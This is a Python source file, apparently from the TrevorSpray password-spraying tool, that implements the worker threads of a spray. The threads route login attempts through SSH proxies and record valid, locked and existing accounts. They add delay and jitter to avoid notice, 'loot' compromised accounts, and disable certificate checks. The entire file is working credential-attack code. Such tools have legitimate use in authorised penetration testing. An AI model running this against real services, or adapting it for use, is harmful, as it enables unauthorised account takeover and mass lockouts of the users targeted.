import random
import logging
import requests
import threading
from time import sleep
from trevorproxy.lib.ssh import SSHProxy
from trevorproxy.lib.errors import SSHProxyError

log = logging.getLogger('trevorspray.proxy')


class ProxyThread(threading.Thread):

    def __init__(self, *args, **kwargs):

        self.trevor = kwargs.pop('trevor', None)
        host = kwargs.pop('host', None)
        proxy_port = kwargs.pop('proxy_port', None)

        if host is None:
            self.proxy = None
            self.proxy_arg = None
        else:
            self.proxy = SSHProxy(
                host=host,
                key=self.trevor.options.key,
                key_pass=self.trevor.options.key_pass,
                proxy_port=proxy_port,
            )
            self.proxy.start()
            self.proxy_arg = {
                'http': str(self.proxy),
                'https': str(self.proxy)
            }

        super().__init__(*args, **kwargs)
        self._running = False
        self.lock = threading.Lock()
        self.q = None


    def submit(self, user, password):

        with self.lock:
            if self.q is None:
                self.q = (user, password)
                return True
        return False


    def run(self):

        while not self.trevor._stop:

            try:

                user, password = None, None
                with self.lock:
                    if self.q is not None:
                        user, password = self.q
                        self.q = None

                login_id = f'{self.trevor.sprayer.id}|{user}|{password}'

                if not user:
                    sleep(.1)
                    continue

                self._running = True

                with self.trevor.lock:
                    self.trevor.sprayed_counter += 1
                    if login_id in self.trevor.tried_logins:
                        log.info(f'Already tried {user}:{password}, skipping.')
                        self._running = False
                        continue

                valid, exists, locked, msg = self.check_cred(user, password)

                with self.trevor.lock:
                    self.trevor.tried_logins[login_id] = True

                    if valid:
                        exists = True
                        log.success(f'{user}:{password} - {msg}')
                        self.trevor.valid_logins.append(f'{user}:{password}')
                    elif locked:
                        log.error(f'{user}:{password} - {msg}')
                    elif exists:
                        log.warning(f'{user}:{password} - {msg}')
                    else:
                        log.info(f'{user}:{password} - {msg}')

                    if exists:
                        self.trevor.existent_users.append(user)

                    if locked:
                        self.trevor.lockout_counter += 1

                    if valid and not self.trevor.options.no_loot:
                        self.trevor.sprayer.loot((user, password))

                    # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
                    if not self.trevor.options.force and self.trevor.lockout_counter == 10 and self.trevor.lockout_question == False:
                        log.error('Multiple Account Lockouts Detected!')
                        log.error('10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?')
                        yes = {'yes', 'y'}
                        no = {'no', 'n', ''}
                        self.trevor.lockout_question = True
                        choice = 'X'
                        while (choice not in no and choice not in yes):
                            choice = input('[USER] [Y/N] (default is N): ').lower()

                        if choice in no:
                            log.info('Cancelling the password spray.')
                            log.info('NOTE: If you are seeing multiple "account is locked" messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.')
                            break

                print(f'       Sprayed {self.trevor.sprayed_counter:,} / {len(self.trevor.options.users):,} accounts\r', end='', flush=True)

                if locked and self.options.lockout_delay:
                    log.verbose(f'Lockout encountered, sleeping thread for {self.options.lockout_delay:,} seconds')

                if (self.trevor.options.delay or self.trevor.options.jitter) and (exists or self.trevor.sprayer.fail_nonexistent):
                    delay = float(self.trevor.options.delay)
                    jitter = random.random() * self.trevor.options.jitter
                    delay += jitter
                    if delay > 0:
                        if self.trevor.options.ssh:
                            log.debug(f'Sleeping thread for {delay:.1f} seconds ({self.trevor.options.delay:.1f}s delay + {jitter:.1f}s jitter)')
                            sleep(delay)
                        else:
                            log.debug(f'Sleeping for {delay:.1f} seconds ({self.trevor.options.delay:.1f}s delay + {jitter:.1f}s jitter)')
                            with self.trevor.lock:
                                sleep(delay)

                self._running = False

            except Exception as e:
                log.error(f'Unhandled error in proxy thread: {e}')
                if log.level <= logging.DEBUG:
                    import traceback
                    log.error(traceback.format_exc())
                else:
                    log.error(f'Encountered error (-v to debug): {e}')
                self.trevor._stop = True
                self._running = False
                break


    @property
    def running(self):

        return self._running or self.q is not None
    


    def check_cred(self, user, password):

        result = None
        while result is None:
            try:
                session = requests.Session()
                try:
                    request = self.trevor.sprayer.create_request(user, password).prepare()
                except Exception as e:
                    log.error(f'Unhandled error in {self.trevor.sprayer.__class__.__name__}.create_request(): {e}')
                    if log.level <= logging.DEBUG:
                        import traceback
                        log.error(traceback.format_exc())
                    self.trevor._stop = True
                    self._running = False
                    break

                log.debug(f'Requesting {request.method} {request.url} through proxy: {self.proxy}')
                kwargs = {
                    'timeout': self.trevor.options.timeout,
                    'allow_redirects': False,
                    'verify': False
                }
                if self.proxy is not None:
                    kwargs['proxies'] = self.proxy_arg
                response = session.send(
                    request,
                    **kwargs
                )
                log.debug(f'Finished requesting {request.url} through proxy: {self.proxy}')
                try:
                    result = self.trevor.sprayer.check_response(response)
                except Exception as e:
                    log.error(f'Unhandled error in {self.trevor.sprayer.__class__.__name__}.check_response(): {e}')
                    if log.level <= logging.DEBUG:
                        import traceback
                        log.error(traceback.format_exc())

            except requests.exceptions.RequestException as e:
                log.error(f'Error in request: {e}')
                log.error('Retrying...')
                # rebuild proxy
                if self.proxy_arg:
                    try:
                        self.proxy.start()
                    except SSHProxyError as e:
                        log.error(e)
                sleep(1)
        return result
